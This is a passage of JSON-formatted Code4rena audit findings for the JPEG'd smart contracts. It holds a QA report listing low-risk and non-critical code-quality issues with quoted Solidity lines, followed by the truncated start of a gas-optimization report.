    "body": "## Low Risk Issues\n\n\n### Missing checks for `address(0x0)` when assigning values to `address` state variables\n\n1. File: contracts/escrow/NFTEscrow.sol (line [38](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/escrow/NFTEscrow.sol#L38))\n```solidity\n        nftAddress = _nftAddress;\n```\n2. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [79](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L79))\n```solidity\n        collateralAsset = _collateralAsset;\n```\n\n### Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions\nSee [this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future.\n\n1. File: contracts/helpers/CryptoPunksHelper.sol (line [16](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/CryptoPunksHelper.sol#L16))\n```solidity\ncontract CryptoPunksHelper is NFTEscrow, OwnableUpgradeable {\n```\n2. File: contracts/helpers/EtherRocksHelper.sol (line [16](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/EtherRocksHelper.sol#L16))\n```solidity\ncontract EtherRocksHelper is NFTEscrow, OwnableUpgradeable {\n```\n\n## Non-critical Issues\n\n\n### `public` functions not called by the contract should be declared `external` instead\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\n\n1. File: contracts/vaults/yVault/Controller.sol (line [151](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L151))\n```solidity\n    function withdraw(IERC20 _token, uint256 _amount) public {\n```\n2. File: contracts/vaults/yVault/yVault.sol (line [115](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L115))\n```solidity\n    function setFarmingPool(address _farm) public onlyOwner {\n```\n\n### `constant`s should be defined rather than using magic numbers\n\n1. File: contracts/escrow/NFTEscrow.sol (line [98](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/escrow/NFTEscrow.sol#L98))\n```solidity\n                bytes1(0xff),\n```\n2. File: contracts/vaults/NFTVault.sol (line [465](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L465))\n```solidity\n            decimals > 18\n```\n3. File: contracts/vaults/NFTVault.sol (line [466](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L466))\n```solidity\n                ? uint256(answer) / 10**(decimals - 18)\n```\n4. File: contracts/vaults/NFTVault.sol (line [467](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L467))\n```solidity\n                : uint256(answer) * 10**(18 - decimals);\n```\n5. File: contracts/vaults/NFTVault.sol (line [593](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L593))\n```solidity\n        uint256 interestPerSec = interestPerYear / 365 days;\n```\n6. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [112](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L112))\n```solidity\n            decimals > 18\n```\n7. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [113](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L113))\n```solidity\n                ? uint256(answer) / 10**(decimals - 18)\n```\n8. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [114](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L114))\n```solidity\n                : uint256(answer) * 10**(18 - decimals);\n```\n9. File: contracts/vaults/yVault/yVault.sol (line [196](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L196))\n```solidity\n        return (balance() * 1e18) / supply;\n```\n10. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [126](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L126))\n```solidity\n        require(_curveConfig.pusdIndex < 4, \"INVALID_PUSD_CURVE_INDEX\");\n```\n11. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [127](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L127))\n```solidity\n        require(_curveConfig.usdcIndex < 4, \"INVALID_USDC_CURVE_INDEX\");\n```\n12. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [343](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L343))\n```solidity\n                    abi.encodePacked(weth, uint24(500), usdc),\n```\n13. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [368](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L368))\n```solidity\n            10**12;\n```\n14. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [371](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L371))\n```solidity\n        uint256[4] memory liquidityAmounts = [uint256(0), 0, 0, 0];\n```\n15. File: contracts/farming/yVaultLPFarming.sol (line [94](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L94))\n```solidity\n            1e36;\n```\n16. File: contracts/farming/yVaultLPFarming.sol (line [172](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L172))\n```solidity\n        newAccRewardsPerShare = accRewardPerShare + newRewards * 1e36 / totalStaked;\n```\n17. File: contracts/farming/yVaultLPFarming.sol (line [179](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L179))\n```solidity\n            (accRewardPerShare - userLastAccRewardPerShare[account])) / 1e36;\n```\n18. File: contracts/farming/LPFarming.sol (line [196](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L196))\n```solidity\n                1e36 *\n```\n19. File: contracts/farming/LPFarming.sol (line [207](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L207))\n```solidity\n            1e36;\n```\n20. File: contracts/farming/LPFarming.sol (line [307](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L307))\n```solidity\n            1e36 *\n```\n21. File: contracts/farming/LPFarming.sol (line [319](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L319))\n```solidity\n            1e36;\n```\n22. File: contracts/lock/JPEGLock.sol (line [33](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/lock/JPEGLock.sol#L33))\n```solidity\n        lockTime = 365 days;\n```\n\n### Use a more recent version of solidity\nUse a solidity version of at least 0.8.4 to get `bytes.concat()` instead of `abi.encodePacked(<bytes>,<bytes>)`\nUse a solidity version of at least 0.8.12 to get `string.concat()` instead of `abi.encodePacked(<str>,<str>)`\n\n1. File: contracts/escrow/NFTEscrow.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/escrow/NFTEscrow.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n2. File: contracts/vaults/yVault/yVault.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n3. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n\n### Use scientific notation (e.g. `1e18`) rather than exponentiation (e.g. `10**18`)\n\n1. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [368](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L368))\n```solidity\n            10**12;\n```\n\n### Non-library/interface files should use fixed compiler versions, not floating ones\n\n1. File: contracts/escrow/NFTEscrow.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/escrow/NFTEscrow.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n2. File: contracts/vaults/NFTVault.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n3. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n4. File: contracts/vaults/yVault/Controller.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n5. File: contracts/vaults/yVault/yVault.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n6. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n7. File: contracts/tokens/StableCoin.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/StableCoin.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n8. File: contracts/tokens/JPEG.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/JPEG.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n9. File: contracts/staking/JPEGStaking.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/staking/JPEGStaking.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n10. File: contracts/farming/yVaultLPFarming.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n11. File: contracts/farming/LPFarming.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n12. File: contracts/lock/JPEGLock.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/lock/JPEGLock.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n13. File: contracts/helpers/CryptoPunksHelper.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/CryptoPunksHelper.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n14. File: contracts/helpers/EtherRocksHelper.sol (line [2](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/EtherRocksHelper.sol#L2))\n```solidity\npragma solidity ^0.8.0;\n```\n\n### File is missing NatSpec\n\n1. File: contracts/tokens/JPEG.sol (line [0](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/JPEG.sol#L0))\n```solidity\n// SPDX-License-Identifier: GPL-3.0\n```\n\n### NatSpec is incomplete\n\n1. File: contracts/escrow/NFTEscrow.sol (lines [56-62](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/escrow/NFTEscrow.sol#L56-L62))\n```solidity\n    /// @dev Virtual function, should return the `payload` to use in {FlashEscrow}'s constructor\n    /// @param _idx The index of the NFT that's going to be sent to the {FlashEscrow} instance\n    function _encodeFlashEscrowPayload(uint256 _idx)\n        internal\n        view\n        virtual\n        returns (bytes memory);\n```\nMissing: `@return` \n\n2. File: contracts/vaults/yVault/Controller.sol (lines [24-25](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L24-L25))\n```solidity\n    /// @param _feeAddress The address to send fees to\n    constructor(address _jpeg, address _feeAddress) {\n```\nMissing: `@param _jpeg` \n\n3. File: contracts/vaults/yVault/yVault.sol (lines [37-49](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L37-L49))\n```solidity\n    /// @param _token The token managed by this vault\n    /// @param _controller The JPEG'd strategies controller\n    constructor(\n        address _token,\n        address _controller,\n        Rate memory _availableTokensRate\n    )\n        ERC20(\n            string(\n                abi.encodePacked(\"JPEG\\xE2\\x80\\x99d \", ERC20(_token).name())\n            ),\n            string(abi.encodePacked(\"JPEGD\", ERC20(_token).symbol()))\n        )\n```\nMissing: `@param _availableTokensRate` \n\n4. File: contracts/farming/yVaultLPFarming.sol (lines [175-177](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L175-L177))\n```solidity\n    /// @dev Updates `account`'s claimable rewards by adding pending rewards\n    /// @param account The account to update\n    function _withdrawReward(address account) internal returns (uint256) {\n```\nMissing: `@return` \n\n5. File: contracts/farming/LPFarming.sol (lines [260-269](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L260-L269))\n```solidity\n    /// @dev Normalizes `blockNumber` to fit within the bounds of an epoch.\n    /// This is done to ensure that no rewards are distributed for staking outside of an epoch without modifying the reward logic.\n    /// For example:\n    /// `blockNumber` is 1100, the epoch's `endBlock` is 1000. In this case the function would return 1000. If this value were to be used\n    /// in the {_updatePool} function, where the pool's `lastRewardBlock` is 990, only the rewards from block 990 to block 1000 would be distributed\n    /// @return Normalized `blockNumber`\n    function _normalizeBlockNumber(uint256 blockNumber)\n        internal\n        view\n        returns (uint256)\n```\nMissing: `@param blockNumber` \n\n6. File: contracts/farming/LPFarming.sol (lines [313-315](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L313-L315))\n```solidity\n    /// @dev Updates `msg.sender`'s claimable rewards by adding pending rewards from `_pid`\n    /// @param _pid The pool to withdraw rewards from\n    function _withdrawReward(uint256 _pid) internal returns (uint256) {\n```\nMissing: `@return` \n\n7. File: contracts/helpers/CryptoPunksHelper.sol (lines [94-100](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/CryptoPunksHelper.sol#L94-L100))\n```solidity\n    /// @dev The {transferPunk} function is used as the escrow's payload.\n    /// @param _idx The index of the punk that's going to be transferred using {NFTEscrow}\n    function _encodeFlashEscrowPayload(uint256 _idx)\n        internal\n        view\n        override\n        returns (bytes memory)\n```\nMissing: `@return` \n\n8. File: contracts/helpers/EtherRocksHelper.sol (lines [99-105](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/EtherRocksHelper.sol#L99-L105))\n```solidity\n    /// @dev The {giftRock} function is used as the escrow's payload.\n    /// @param _idx The index of the rock that's going to be transferred using {NFTEscrow}\n    function _encodeFlashEscrowPayload(uint256 _idx)\n        internal\n        view\n        override\n        returns (bytes memory)\n```\nMissing: `@return` \n\n\n### Event is missing `indexed` fields\nEach `event` should use three `indexed` fields if there are three or more fields\n\n1. File: contracts/vaults/NFTVault.sol (lines [23-27](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L23-L27))\n```solidity\n    event Borrowed(\n        address indexed owner,\n        uint256 indexed index,\n        uint256 amount\n    );\n```\n2. File: contracts/vaults/NFTVault.sol (line [28](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L28))\n```solidity\n    event Repaid(address indexed owner, uint256 indexed index, uint256 amount);\n```\n3. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [31](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L31))\n```solidity\n    event Deposit(address indexed user, uint256 depositAmount);\n```\n4. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [32](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L32))\n```solidity\n    event Borrow(address indexed user, uint256 borrowAmount);\n```\n5. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [33](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L33))\n```solidity\n    event Repay(address indexed user, uint256 repayAmount);\n```\n6. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [34](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L34))\n```solidity\n    event Withdraw(address indexed user, uint256 withdrawAmount);\n```\n7. File: contracts/vaults/yVault/yVault.sol (line [20](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L20))\n```solidity\n    event Deposit(address indexed depositor, uint256 wantAmount);\n```\n8. File: contracts/vaults/yVault/yVault.sol (line [21](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L21))\n```solidity\n    event Withdrawal(address indexed withdrawer, uint256 wantAmount);\n```\n9. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [25](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L25))\n```solidity\n    event Harvested(uint256 wantEarned);\n```\n10. File: contracts/staking/JPEGStaking.sol (line [14](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/staking/JPEGStaking.sol#L14))\n```solidity\n    event Stake(address indexed user, uint256 amount);\n```\n11. File: contracts/staking/JPEGStaking.sol (line [15](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/staking/JPEGStaking.sol#L15))\n```solidity\n    event Unstake(address indexed user, uint256 amount);\n```\n12. File: contracts/farming/yVaultLPFarming.sol (line [18](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L18))\n```solidity\n    event Deposit(address indexed user, uint256 amount);\n```\n13. File: contracts/farming/yVaultLPFarming.sol (line [19](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L19))\n```solidity\n    event Withdraw(address indexed user, uint256 amount);\n```\n14. File: contracts/farming/yVaultLPFarming.sol (line [20](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L20))\n```solidity\n    event Claim(address indexed user, uint256 rewards);\n```\n15. File: contracts/farming/LPFarming.sol (line [20](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L20))\n```solidity\n    event Deposit(address indexed user, uint256 indexed pid, uint256 amount);\n```\n16. File: contracts/farming/LPFarming.sol (line [21](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L21))\n```solidity\n    event Withdraw(address indexed user, uint256 indexed pid, uint256 amount);\n```\n17. File: contracts/farming/LPFarming.sol (line [22](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L22))\n```solidity\n    event Claim(address indexed user, uint256 indexed pid, uint256 amount);\n```\n18. File: contracts/farming/LPFarming.sol (line [23](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L23))\n```solidity\n    event ClaimAll(address indexed user, uint256 amount);\n```\n19. File: contracts/lock/JPEGLock.sol (line [14](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/lock/JPEGLock.sol#L14))\n```solidity\n    event Lock(address indexed user, uint256 indexed nftIndex, uint256 amount);\n```\n20. File: contracts/lock/JPEGLock.sol (line [15](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/lock/JPEGLock.sol#L15))\n```solidity\n    event Unlock(address indexed user, uint256 indexed nftIndex, uint256 amount);\n```\n\n### The `nonReentrant` `modifier` should occur before all other modifiers\nThis is a best-practice to protect against reentrancy in other modifiers\n\n1. File: contracts/vaults/NFTVault.sol (line [679](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L679))\n```solidity\n    ) external validNFTIndex(_nftIndex) nonReentrant {\n```\n2. File: contracts/vaults/NFTVault.sol (line [759](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L759))\n```solidity\n        nonReentrant\n```\n3. File: contracts/vaults/NFTVault.sol (line [834](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L834))\n```solidity\n        nonReentrant\n```\n4. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [163](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L163))\n```solidity\n    function borrow(uint256 amount) external onlyRole(WHITELISTED_ROLE) nonReentrant {\n```\n5. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [179](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L179))\n```solidity\n    function repay(uint256 amount) external onlyRole(WHITELISTED_ROLE) nonReentrant {\n```\n6. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [193](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L193))\n```solidity\n    function withdraw(uint256 amount) external onlyRole(WHITELISTED_ROLE) nonReentrant {\n```\n7. File: contracts/lock/JPEGLock.sol (line [53](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/lock/JPEGLock.sol#L53))\n```solidity\n    ) external onlyOwner nonReentrant {\n```\n\n### Typos\n\n1. File: contracts/escrow/NFTEscrow.sol (line [30](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/escrow/NFTEscrow.sol#L30))\n```solidity\n/// This is an alternative to the classic \"reservation\" method, which requires users to call 3 functions in a specifc order (making the process non atomic)\n```\nspecifc\n\n2. File: contracts/vaults/NFTVault.sol (line [117](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L117))\n```solidity\n        //The standard OZ ERC721 implementation of ownerOf reverts on a non existing nft isntead of returning address(0)\n```\nisntead\n\n3. File: contracts/vaults/NFTVault.sol (line [625](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L625))\n```solidity\n    /// @notice Returns data relative to a postition, existing or not\n```\npostition\n\n4. File: contracts/vaults/NFTVault.sol (line [673](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L673))\n```solidity\n    /// @param _useInsurance Whereter to open an insured position. In case the position has already been opened previously,\n```\nWhereter\n\n5. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [50](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L50))\n```solidity\n    /// instead of fetching it everytime to save gas\n```\neverytime\n\n6. File: contracts/vaults/yVault/Controller.sol (line [128](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L128))\n```solidity\n    /// @notice Allows members of the `STRATEGIST_ROLE` to withdraw tokens stuck in this constract\n```\nconstract\n",
    "dataSource": {
      "name": "code-423n4/2022-04-jpegd-findings",
      "repo": "https://github.com/code-423n4/2022-04-jpegd-findings",
      "url": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/204"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## Gas\n\n### Issues found\n\n### 1. All contracts using unlocked pragma\n#### Impact\nAll the contracts in scope use `pragma solidity ^0.8.0`, allowing wide enough range of versions.\n#### Proof of Concept\n```shell\npragma version^0.8.0 (contracts/escrow/NFTEscrow.sol#2) \npragma version^0.8.0 (contracts/staking/JPEGStaking.sol#2) \npragma version^0.8.0 (contracts/vaults/FungibleAssetVaultForDAO.sol#2) \npragma version^0.8.0 (contracts/vaults/NFTVault.sol#2) \npragma version^0.8.0 (contracts/farming/LPFarming.sol#2) \npragma version^0.8.0 (contracts/farming/yVaultLPFarming.sol#2) \npragma version^0.8.0 (contracts/tokens/JPEG.sol#2) \npragma version^0.8.0 (contracts/tokens/StableCoin.sol#2) \npragma version^0.8.0 (contracts/vaults/yVault/Controller.sol#2) \npragma version^0.8.0 (contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#2) \npragma version^0.8.0 (contracts/vaults/yVault/yVault.sol#2) \n```\n#### Recommendation\nConsider locking compiler version, for example `pragma solidity 0.8.6`.\nThis can have additional benefits, for example using custom errors to save gas and so forth.\n\n### 2. Cache Array Length Outside of Loop.\n#### Impact\nCache length outside of for loop to save gas.\n#### Proof of Concept\n[`LPFarming.sol#L348`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L348), [`NFTVault.sol#L181`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L181), [`NFTVault.sol#L184`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L184), [`StrategyPUSDConvex.sol#L145`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L145), [`StrategyPUSDConvex.sol#L319`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L319).\n\n#### Recommendation\n\nMore gas efficient example for 